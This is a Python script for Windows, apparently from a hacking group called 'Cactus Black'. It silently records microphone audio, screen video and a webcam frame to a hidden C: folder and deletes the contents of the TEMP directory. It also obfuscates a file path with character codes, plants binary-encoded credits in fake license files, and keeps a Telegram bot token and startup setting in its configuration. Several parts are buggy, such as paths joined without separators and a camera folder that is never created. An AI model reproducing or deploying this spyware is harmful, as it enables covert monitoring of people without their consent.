try :
    import time
    import os
    import shutil
    import json
    import sounddevice as sd
    import soundfile as sf
    from win10toast import ToastNotifier
    import cv2
    import pyautogui
    import numpy as np
    import threading
    from datetime import datetime
except ModuleNotFoundError as Error:
    os.system('start  /wait cmd')
    from subprocess import call
    call("pip install " + ' '.join(Error.name), shell=True)
    os.system('cmd /c "color 3"')
    os.system('cmd /c "cls"')

def Install_Program():
    if "LOG_Program_Cactus_Black" not in os.listdir("C:/") :
        os.mkdir("C:/LOG_Program_Cactus_Black")
    else:
        if "Setting.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            Load_Data_Setting()
        if "Install.ini" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            Install = open("C:/LOG_Program_Cactus_Black/Install.ini", "w")
            Install.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
            Install.close()
        if "License.ini" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            License = open("C:/LOG_Program_Cactus_Black/License.ini", "w")
            License.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
            License.close()
        if "TimeLog.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            TimeLog = open("C:/LOG_Program_Cactus_Black/TimeLog.Cactus_Black", "w")
            TimeLog.close()
        if "ErrorLog.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            ErrorLog = open("C:/LOG_Program_Cactus_Black/ErrorLog.Cactus_Black", "w")
            ErrorLog.close()
        if "DataBase.Cactus_Black" not in os.listdir("C:/LOG_Program_Cactus_Black/") :
            DataBase = open("C:/LOG_Program_Cactus_Black/DataBase.Cactus_Black", "w")
            DataBase.write("01000011 01110010 01100101 01100001 01110100 01101001 01101110 01100111 00100000 01110111 01101000 01101001 01110100 00100000 01000011 01100001 01100011 01110100 01110101 01110011 00100000 01000010 01101100 01100001 01100011 01101011 00100000 01000111 01110010 01110101 01110000 00001010 01101000 01110100 01110100 01110000 01110011 00111010 00101111 00101111 01110100 00101110 01101101 01100101 00101111 01000111 01110010 01110101 01110000 01011111 01001000 01100001 01100011 01101011 01101001 01101110 01100111 01011111 01000011 01100001 01100011 01110100 01110101 01110011 01011111 01000010 01101100 01100001 01100011 01101011")
            DataBase.close()
        if "ScreenRecords" not in os.listdir("C:/LOG_Program_Cactus_Black/"):
            os.mkdir("C:/LOG_Program_Cactus_Black/ScreenRecords")
        if "AudiuRecords" not in os.listdir("C:/LOG_Program_Cactus_Black/"):
            os.mkdir("C:/LOG_Program_Cactus_Black/AudiuRecords")

Install_Program()

def Load_Data_Setting(ret = "str"):
    global DefaultSetting
    DefaultSetting = {
        "Audiu" : {
            "Ra" : "True",
            "TRa" : "180",
        },
        "screen" : {
            "Rs" : "True",
            "TRs" : "180",
        },
        "startup" : {
            "Ls" : "True",
        },
        "Delete" : {
            "De" : "True",
        },
        "TelBot" : {
            "Tb" : "False",
            "ID" : "1234567890",
            "API": "1234567890:AAHYdFETSH5JKduIUfrLzqffdsGMkJl_0G0"
        },
        "Folder" : {
            "Dir":"C:/LOG_Program_Cactus_Black",
        }
    }
    try:
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"r")
    except:
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"w")
        json.dump(DefaultSetting, file_Setting, indent=4)
        file_Setting.close()
        file_Setting = open(''.join([chr(value) for value in [67,
            58, 47, 76, 79, 71, 95, 80, 114, 111, 103, 114, 97, 109, 95,
            67, 97, 99, 116, 117, 115, 95, 66, 108, 97, 99, 107, 47, 83,
            101, 116, 116, 105, 110, 103, 46, 67, 97, 99, 116, 117, 115,
            95, 66, 108, 97, 99, 107]]),"r")
    if ret == "str" :
        return file_Setting.read()
    elif ret == "List":
        return json.loads(file_Setting.read())

def Record_Sund_and_Screen_File(Time_A ,Time_S, Folder):
    audio_filename = Folder+"AudiuRecords/recorded_audio_"+str(time.strftime( "%Y_%m_%d_T_%H_%M_%S"))+".wav"  # name and path file

    video_filename = Folder+"ScreenRecords/screen_recording_" + str(time.strftime("%Y_%m_%d_T_%H_%M_%S")) + ".mp4"
    fps = 10.0  # FPS
    resolution = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    video_writer = cv2.VideoWriter(video_filename, fourcc, fps, resolution)
    def record_audio():
        audio = sd.rec(int(Time_A * 44100), samplerate=44100, channels=2, dtype='int16')
        sd.wait()
        sf.write(audio_filename, audio, 44100) # Save File
    def record_screen():
        start_time = time.time()
        while time.time() - start_time < Time_S+1:
            # Get ScreenShot!!
            img = pyautogui.screenshot()
            frame = np.array(img) # Set Image to List
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            # Get Pos muse and set to video
            mouse_x, mouse_y = pyautogui.position()
            cv2.circle(frame, (mouse_x, mouse_y), 10, (0, 0, 255), -1) # Drawing a mouse with a red dot
            # Write frames to video
            video_writer.write(frame)
        video_writer.release()
    try:
        # Creating and starting Threads
        audio_thread = threading.Thread(target=record_audio)
        screen_thread = threading.Thread(target=record_screen)

        audio_thread.start()
        screen_thread.start()

        # Wait for both Threads to complete
        audio_thread.join()
        screen_thread.join()
        return "No Error :)"
    except :
        return "Get Error!!"

import cv2
import time

def Record_Camera_File(Folder):
    # Open Camera
    cap = cv2.VideoCapture(1)
    Activ = False

    if not cap.isOpened():
        return "Error: Could not open camera."

    # Try to read a frame from the camera
    ret, frame = cap.read()

    if ret:
        # Show camera feed (optional)
        cv2.imshow('Camera', frame)
        
        # Generate a unique filename using the current timestamp
        filename = Folder+"CameraRecords/Camera_" + str(time.strftime("%Y_%m_%d_T_%H_%M_%S")) + ".jpg"
        
        # Save the captured frame as an image file
        if cv2.imwrite(filename, frame):
            Activ = True

        else:
            print("Error: Could not save the image.")
    else:
        print("Error: Could not read frame from camera.")

    # Release the camera and close the window
    cap.release()
    cv2.destroyAllWindows()

    if Activ:
        return "No Error :)"
    else:
        return "Get Error!!!"

def clear_temp():
    E = ""
    temp_dir = os.getenv('TEMP') or os.getenv('TMP')  # مسیر Temp ویندوز
    if temp_dir and os.path.exists(temp_dir):
        for root, dirs, files in os.walk(temp_dir):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except Exception as e:
                    E = E+"Error - "
            for dir in dirs:
                try:
                    shutil.rmtree(os.path.join(root, dir))
                except Exception as e:
                    E = E+"Error - "
    if E == "" : return "No Error :)"
    if E != "" : return "Get Error!!"

# Get Setting
Setting =  {
    "Audiu" : {
        "Ra" : Load_Data_Setting("List")["Audiu"]["Ra"],
        "TRa" : Load_Data_Setting("List")["Audiu"]["TRa"],
    },
    "screen" : {
        "Rs" : Load_Data_Setting("List")["screen"]["Rs"],
        "TRs" : Load_Data_Setting("List")["screen"]["TRs"],
    },
    "startup" : {
        "Ls" : Load_Data_Setting("List")["startup"]["Ls"],
    },
    "Delete" : {
        "De" : Load_Data_Setting("List")["Delete"]["De"],
    },
    "TelBot" : {
        "Tb" : Load_Data_Setting("List")["TelBot"]["Tb"],
        "ID" : Load_Data_Setting("List")["TelBot"]["ID"],
        "API": Load_Data_Setting("List")["TelBot"]["ID"],
    },
    "Folder" : {
        "Dir":Load_Data_Setting("List")["Folder"]["Dir"],
    }
}

# Create Back Data
SystemAdress = "C:/LOG_Program_Cactus_Black"
Back_FILE_T = ""
Back_FILE_E = ""
# Get Back Data Start Windows
try:
    file = open(Setting["Folder"]["Dir"]+"/TimeLog.Cactus_Black","r")
    Back_FILE_T = file.read()
except :
    Create = open(Setting["Folder"]["Dir"]+"/TimeLog.Cactus_Black","w")
    Create.close()
try:
    file = open(SystemAdress+"/ErrorLog.Cactus_Black","r")
    Back_FILE_E = file.read()
except :
    Create = open(SystemAdress+"/ErrorLog.Cactus_Black","w")
    Create.close()

# Save Log
W_file = open(Setting["Folder"]["Dir"]+"/TimeLog.Cactus_Black","w")
W_file.write(Back_FILE_T+"time start Sys is : "+str(time.strftime( "%Y / %m / %d , %H:%M:%S"))+"\n")
W_file.close()
# Get Data
Camera = Record_Camera_File(Setting["Folder"]["Dir"])
Screen_and_sund  = Record_Sund_and_Screen_File(int(Setting["Audiu"]["TRa"]), int(Setting["screen"]["TRs"]), Setting["Folder"]["Dir"])
ErrorLog = clear_temp()
# Save Errors
Errors = f"Errors {time.strftime('%Y / %m / %d , %H:%M:%S')} is : \nErrors Record Camera : {Camera}\nErrors Record Screen & Sund : {Screen_and_sund}\nnErrors Remove Temp Files : {ErrorLog}"
W_file = open(SystemAdress+"/ErrorLog.Cactus_Black","w")
W_file.write(Back_FILE_E+Errors)
W_file.close()
# Show Notife End
toast = ToastNotifier()
masege = ("Hi Welcom King!")
toast.show_toast("Welcome!",masege,duration = 5,threaded = True)
